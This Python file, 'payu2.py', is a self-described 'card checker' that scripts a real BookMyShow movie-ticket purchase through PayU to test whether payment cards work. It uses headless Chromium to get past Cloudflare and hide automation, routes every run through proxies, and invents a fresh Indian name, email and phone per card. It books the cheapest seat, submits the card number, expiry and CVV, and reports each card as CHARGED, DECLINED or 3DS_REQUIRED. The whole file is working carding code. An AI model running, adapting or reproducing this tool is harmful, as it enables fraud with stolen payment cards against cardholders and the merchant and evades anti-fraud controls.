"""
payu2.py — BookMyShow (BMS) + PayU India card checker.

Full flow replayed from bookmyshow.har:
  1. solve Cloudflare (Playwright chromium)
  2. movie list  -> cheapest event (movie)
  3. showtimes   -> cheapest session (venue + sessionId)
  4. seat layout -> cheapest ticket category (priceCode + areaCatCode) + a seat
  5. booking     -> transactionId + transactionUID + bookingId
  6. doPGPost    -> PayU order (card + email + phone)
  7. PayU checkoutx/payments -> submit (3DS if required)
  8. check-status -> result (CHARGED / APPROVED / DECLINED / 3DS_REQUIRED / ERROR)

Every run is fully proxied (never the VPS IP). Email + phone are generated per
check. The result is mapped from the BMS check-status state + PayU error code.
"""
from __future__ import annotations

import asyncio
import json
import random
import re
import time
import uuid
import urllib.parse
from dataclasses import dataclass, field

# ── constants (from the HAR / BMS web JS bundle) ────────────────────────
TOKEN = "67x1xa33b4x422b361ba"       # fixed public token in the BMS JS
APP_CODE = "WEB"
COMPANY_CODE = "CNPL"
SEAT_LAYOUT_TYPE = "Y"
REGION = "mumbai"
REGION_CODE = "MUMBAI"
BMS_HOME = "https://in.bookmyshow.com"
SERVICES = "https://services-in.bookmyshow.com"
def _today():
    from datetime import datetime
    return datetime.now().strftime("%Y%m%d")


DATE = _today()                      # show date = today (matches the 2nd HAR)

# browser impersonation (same curl_cffi profiles family as shopify v7)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

_CURRENT_BMS_ID = None

# required x-* headers for the BMS web API (from the HAR)
_BMS_HEADERS = {
    "x-region-code": REGION_CODE,
    "x-region-slug": REGION,
    "x-latitude": "19.076",
    "x-longitude": "72.8777",
    "x-app-code": APP_CODE,
    "x-platform-code": "DESKTOP-WEB",
    "x-platform": "WEB",
    "x-advertiser-id": "1641377675614338967",
    "x-segments": "",
    "x-location-selection": "manual",
    "x-dc-token": "aps",
    "x-geohash": "te7",
}


@dataclass
class BmsResult:
    response_code: str = "ERROR"      # CHARGED / APPROVED / DECLINED / 3DS_REQUIRED / ERROR
    real_response: str = "N/A"
    amount: str = "0.00"
    transaction_id: str = ""
    booking_id: str = ""


def _phone() -> str:
    """Generate a plausible Indian mobile (9000000000 - 9999999999)."""
    return "9" + "".join(random.choices("0123456789", k=9))


def _email(first: str, last: str) -> str:
    return f"{first.lower()}{last.lower()}{random.randint(1000, 9999)}@gmail.com"


def _bms_id() -> str:
    return f"1.{random.randint(100000000, 999999999)}.{int(time.time() * 1000)}"


def _fb_id() -> str:
    return f"fb.1.{int(time.time() * 1000)}.{random.randint(100000000000000000, 999999999999999999)}"


# ── Playwright helpers ───────────────────────────────────────────────────

def _parse_proxy(proxy_url: str) -> dict:
    """user:pass@host:port -> playwright proxy dict."""
    if not proxy_url:
        return {}
    u = urllib.parse.urlparse(proxy_url if "://" in proxy_url else "http://" + proxy_url)
    d = {"server": f"{u.scheme}://{u.hostname}:{u.port or 80}"}
    if u.username:
        d["username"] = urllib.parse.unquote(u.username)
        d["password"] = urllib.parse.unquote(u.password or "")
    return d


async def _launch(proxy_url: str):
    from playwright.async_api import async_playwright
    pw = await async_playwright().start()
    proxy = _parse_proxy(proxy_url)
    browser = await pw.chromium.launch(
        headless=True,
        proxy=proxy,
        args=["--no-sandbox", "--disable-blink-features=AutomationControlled"],
    )
    ctx = await browser.new_context(
        user_agent=UA,
        viewport={"width": 1366, "height": 768},
        locale="en-IN",
        extra_http_headers={"Accept-Language": "en-US,en;q=0.9"},
    )
    page = await ctx.new_page()
    return pw, browser, ctx, page


async def _solve_cloudflare(page, url: str):
    """Navigate to BMS and wait until Cloudflare clears (cf_clearance cookie)."""
    await page.goto(url, timeout=60000, wait_until="domcontentloaded")
    for _ in range(8):
        await page.wait_for_timeout(4000)
        cookies = await page.context.cookies()
        if any(c["name"] == "cf_clearance" for c in cookies):
            # bmsId cookie (quoted, like the HAR) — required by the booking API
            await page.context.add_cookies([{"name": "bmsId", "value": '"' + (_CURRENT_BMS_ID or _bms_id()) + '"', "url": BMS_HOME}])
            await page.wait_for_timeout(2000)
            return
    raise Exception("cloudflare: clearance cookie not obtained")


async def _bms_fetch(page, path: str, method="GET", body=None, extra=None):
    """Request via the browser context's APIRequestContext (shares Cloudflare + BMS cookies,
    no CORS restrictions — works for in.bookmyshow.com AND services-in.bookmyshow.com / api.payu.in)."""
    headers = dict(_BMS_HEADERS)
    headers["x-bms-id"] = _CURRENT_BMS_ID or _bms_id()
    if extra:
        headers.update(extra)
    url = path if path.startswith("http") else BMS_HOME + path
    req = page.context.request
    if method == "GET":
        r = await req.get(url, headers=headers)
    else:
        if isinstance(body, dict):
            headers.setdefault("Content-Type", "application/json")
            data = json.dumps(body)
        else:
            headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
            data = body
        r = await req.post(url, headers=headers, data=data)
    text = await r.text()
    return {"status": r.status, "url": url, "body": text}


def _extract(data: dict, path: str, default=None):
    cur = data
    for p in path.split("."):
        if isinstance(cur, dict):
            cur = cur.get(p)
        elif isinstance(cur, list) and p.isdigit():
            cur = cur[int(p)] if int(p) < len(cur) else None
        else:
            return default
        if cur is None:
            return default
    return cur


# ── flow steps ───────────────────────────────────────────────────────────

async def fetch_movies(page):
    """Movie list -> [{eventCode, title}] (event codes live in card ctaUrls like
    .../movies/mumbai/<slug>/ET00517731)."""
    q = urllib.parse.urlencode({"region": REGION_CODE, "embedded": "true", "scrollId": "5b17ce012bbb80403006878654"})
    r = await _bms_fetch(page, f"/api/explore/v1/discover/home/{REGION}?{q}")
    if r["status"] != 200:
        raise Exception(f"movie list: HTTP {r['status']}")
    body = r["body"]
    events = []
    seen = set()
    for m in re.finditer(r'ET[0-9]{6,}', body):
        ec = m.group(0)
        if ec not in seen:
            seen.add(ec)
            events.append({"eventCode": ec, "title": ec})
    return events


async def fetch_showtimes(page, event_code: str, date_code: str):
    """Showtimes for one event -> [{venueCode, sessionId}]."""
    q = urllib.parse.urlencode({"etCodes": event_code, "dateCode": date_code,
                                "isDesktop": "true", "regionCode": REGION_CODE,
                                "xLocationShared": "false", "memberId": ""})
    r = await _bms_fetch(page, f"/api/movies-data/v5/showtimes-by-event/primary-dynamic?{q}")
    if r["status"] != 200:
        raise Exception(f"showtimes: HTTP {r['status']}")
    data = json.loads(r["body"])
    sessions = []
    cur_venue = [""]
    def scan(o):
        if isinstance(o, dict):
            if o.get("venueCode"):
                cur_venue[0] = o["venueCode"]
            if o.get("sessionId") is not None:
                sessions.append({"venueCode": cur_venue[0], "sessionId": str(o["sessionId"])})
            for v in o.values():
                scan(v)
        elif isinstance(o, list):
            for v in o:
                scan(v)
    scan(data)
    # de-dupe session ids, keep venue order
    seen = set()
    out = []
    for s in sessions:
        if s["sessionId"] not in seen:
            seen.add(s["sessionId"])
            out.append(s)
    return out


async def fetch_seat_layout(page, event_code: str, date_code: str, venue_code: str):
    """Seat layout -> [{sessionId, category:{priceCode, areaCatCode, curPrice}}]."""
    q = urllib.parse.urlencode({"eventCode": event_code, "dateCode": date_code,
                                "regionCode": REGION_CODE, "venueCode": venue_code})
    r = await _bms_fetch(page, f"/api/movies-data/seatlayout/v1/primary?{q}")
    if r["status"] != 200:
        raise Exception(f"seat layout: HTTP {r['status']}")
    data = json.loads(r["body"])
    shows = []
    for st in _extract(data, "data.showTimes", []) or []:
        cats = []
        for c in st.get("categories", []):
            cats.append({"priceCode": c.get("priceCode"), "areaCatCode": c.get("areaCatCode"),
                         "curPrice": float(c.get("curPrice") or 0), "availStatus": c.get("availStatus")})
        shows.append({"sessionId": str(st.get("sessionId")), "categories": cats})
    return shows


def _pick_cheapest(shows):
    """Return (sessionId, priceCode, areaCatCode, curPrice) for the cheapest available ticket."""
    best = None
    for sh in shows:
        for c in sh["categories"]:
            if not c["curPrice"]:
                continue
            cand = {"sessionId": sh["sessionId"], "priceCode": c["priceCode"],
                    "areaCatCode": c["areaCatCode"], "curPrice": c["curPrice"]}
            if best is None or c["curPrice"] < best["curPrice"]:
                best = cand
    if not best:
        raise Exception("seat layout: no available ticket category")
    return best


async def book(page, event_code, venue_code, session_id, price_code, area_code, first, last, email):
    """POST booking -> transactionId + transactionUID + bookingId."""
    bms_id = _CURRENT_BMS_ID or _bms_id()
    fb_id = _fb_id()
    body = {
        "appCode": APP_CODE,
        "venueCode": venue_code,
        "eventCode": event_code,
        "sessionId": session_id,
        "numberOfTickets": 1,
        "ticketCategory": price_code,
        "bmsId": bms_id,
        "token": TOKEN,
        "seatLayoutType": SEAT_LAYOUT_TYPE,
        "offerData": {"offerSelected": False},
        "companyCode": COMPANY_CODE,
        "facebookBrowserId": fb_id,
    }
    referer = f"{BMS_HOME}/movies/mumbai/seat-layout/{event_code}/{venue_code}/{session_id}/{DATE}"
    # probe seats until one is free (seat map is client-rendered; booking rejects taken/invalid seats).
    # seatNo scheme is venue-specific, so try several per grid cell.
    def candidates(row, col):
        return [
            f"|1|{area_code}|{row}|{col}|{col}|",                 # SPCP: seatNo = col
            f"|1|{area_code}|{row}|{col}|{col:03d}|",             # zero-padded
            f"|1|{area_code}|{row}|{col}|{(row-1)*21 + col}|",    # CSWO: global seat count
            f"|1|{area_code}|{row}|{col}|{(row-1)*21 + col:03d}|",
            f"|1|{area_code}|{row}|{col}|{(row-1)*20 + col}|",
            f"|1|{area_code}|{row}|{col}|{(row-1)*20 + col:03d}|",
        ]
    for row in range(1, 8):
        for col in range(1, 26):
            for seats in candidates(row, col):
                body["selectedSeats"] = seats
                r = await _bms_fetch(page, "/api/v2/mobile/booking/movies", "POST", body,
                                     extra={"Referer": referer, "Origin": BMS_HOME})
                if r["status"] == 200:
                    data = json.loads(r["body"])
                    if data.get("transactionId"):
                        return {
                            "transactionId": str(data["transactionId"]),
                            "transactionUID": data.get("transactionUID", ""),
                            "bookingId": data.get("bookingId", ""),
                        }
                await asyncio.sleep(0.1)
    raise Exception("booking: no available seat found")


async def pay(page, trans, card, first, last, email, phone):
    """doPGPost (card + contact) -> PayU redirect; follow to checkoutx/payments."""
    number, month, year, cvv = card
    exp = year + month                      # YYYYMM
    brand = _card_brand(number)
    str_payment = f"|TYPE=CREDIT|CARDTYPE={brand}|CARDNO={number}|EXPIRY={exp}|CVV={cvv}|NAME={first}|MEMBERID=|LSID=|"
    str_booking = f"|EMAIL={email}|MOBILE={phone}|"
    form = {
        "strAppCode": APP_CODE,
        "lngTransId": trans["transactionId"],
        "transactionUID": trans["transactionUID"],
        "strBookingAlert": str_booking,
        "strPaymentString": str_payment,
        "strTransData": "|ETICKET=Y|MTICKET=Y|",
        "TD": "",
        "strEventType": "MT",
        "strReturnUrl": "",          # BMS JS fills this; empty may still work for the checker
        "deemedIsdCode": "+91",
        "isdCode": "+91",
        "presaleUUID": "",
    }
    r = await _bms_fetch(page, f"{SERVICES}/payserv/doPGPost.aspx", "POST",
                         urllib.parse.urlencode(form),
                         extra={"Content-Type": "application/x-www-form-urlencoded",
                                "Referer": f"{BMS_HOME}/booking/"})
    return r


async def check_result(page, trans_id: str):
    """check-status -> state (Success/Failed) + message."""
    body = {
        "appCode": APP_CODE,
        "transactionId": trans_id,
        "paymentId": "",
        "payType": "JUSPAY_CARD",
        "paymentString": f"|TYPE=JUSPAY_CARD|PROCESSTYPE=CHECK_ORDER_STATUS|PaymentId=|TransId={trans_id}|AppCode={APP_CODE}|BankCode=|",
    }
    for _ in range(10):
        r = await _bms_fetch(page, f"{SERVICES}/payments/v1/orders/check-status", "POST", body)
        if r["status"] == 200:
            data = json.loads(r["body"])
            state = _extract(data, "view.state") or _extract(data, "redirectionParamsData.isSuccess")
            msg = _extract(data, "view.message") or ""
            if state:
                return state, msg
        await asyncio.sleep(2.0)
    return "Unknown", ""


def _card_brand(number: str) -> str:
    n = number[:6]
    if n[:1] == "4":
        return "VISA"
    if n[:2] in ("51", "52", "53", "54", "55") or 2221 <= int(n[:4]) <= 2720:
        return "MASTERCARD"
    if n[:2] in ("36", "38") or n[:4] in ("3000", "3050", "3400", "3700"):
        return "DINERS"
    if n[:4] == "6011" or n[:2] == "65":
        return "DISCOVER"
    return "CARD"


# ── result mapping (BMS state / PayU error -> our code) ─────────────────

_SUCCESS_STATES = ("Success", "success", "SUCCESS", "Paid", "Charged")
_FAIL_STATES = ("Failed", "failure", "FAILED", "Declined")

_PAYU_CODE_MAP = {
    "SUCCESS": "CHARGED",
    "CARD_INSUFFICIENT_FUNDS": "DECLINED",
    "REFUSED_BY_ISSUER": "DECLINED",
    "NOT_ACCEPTED": "DECLINED",
    "DECLINED": "DECLINED",
    "INSUFFICIENT_FUNDS": "DECLINED",
    "3DS": "3DS_REQUIRED",
    "CHALLENGE_REQUIRED": "3DS_REQUIRED",
}


def _map_result(state: str, msg: str, payu_code: str = "") -> tuple:
    if payu_code:
        code = _PAYU_CODE_MAP.get(payu_code.upper(), payu_code.upper())
        return code, payu_code
    s = str(state or "")
    if any(x.lower() in s.lower() for x in _SUCCESS_STATES):
        return "CHARGED", state
    if any(x.lower() in s.lower() for x in _FAIL_STATES):
        return "DECLINED", msg or state
    return "ERROR", msg or state


# ── entry point ─────────────────────────────────────────────────────────

async def run_bms_check(cc: str, proxy_url: str = "") -> BmsResult:
    """Full BMS + PayU checkout for one card. cc = 'num|mm|yy|cvv'."""
    res = BmsResult()
    parts = cc.replace("/", "|").replace(" ", "|").split("|")
    if len(parts) != 4:
        res.real_response = "invalid card format"
        return res
    number, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year
    card = (number, month, year, cvv)

    first = random.choice(["Aarav", "Vivaan", "Aditya", "Rohan", "Kabir", "Arjun", "Ishaan", "Dev"])
    last = random.choice(["Sharma", "Patel", "Iyer", "Nair", "Reddy", "Mehta", "Kulkarni", "Joshi"])
    email = _email(first, last)
    phone = _phone()

    global _CURRENT_BMS_ID
    _CURRENT_BMS_ID = _bms_id()
    pw, browser, ctx, page = await _launch(proxy_url)
    try:
        await _solve_cloudflare(page, f"{BMS_HOME}/movies/{REGION}")

        # 1. movies -> iterate until one books (cheapest available across events)
        movies = await fetch_movies(page)
        if not movies:
            res.real_response = "no movies"
            return res
        trans = None
        cheapest = None
        for movie in movies[:10]:
            event_code = movie["eventCode"]
            try:
                sessions = await fetch_showtimes(page, event_code, DATE)
                if not sessions:
                    continue
                venue_code = sessions[0]["venueCode"]
                session_id = sessions[0]["sessionId"]
                shows = await fetch_seat_layout(page, event_code, DATE, venue_code)
                if not shows:
                    continue
                cheapest = _pick_cheapest(shows)
                trans = await book(page, event_code, venue_code, session_id,
                                   cheapest["priceCode"], cheapest["areaCatCode"], first, last, email)
                res.transaction_id = trans["transactionId"]
                res.booking_id = trans["bookingId"]
                res.amount = f"{cheapest['curPrice']:.2f}"
                break
            except Exception:
                continue
        if trans is None:
            res.real_response = "no bookable movie/show"
            return res

        # 5. pay (doPGPost + PayU)
        pay_resp = await pay(page, trans, card, first, last, email, phone)

        # 6. result
        state, msg = await check_result(page, trans["transactionId"])
        code, real = _map_result(state, msg)
        res.response_code = code
        res.real_response = real
        return res
    finally:
        try:
            await browser.close()
        except Exception:
            pass
        try:
            await pw.stop()
        except Exception:
            pass
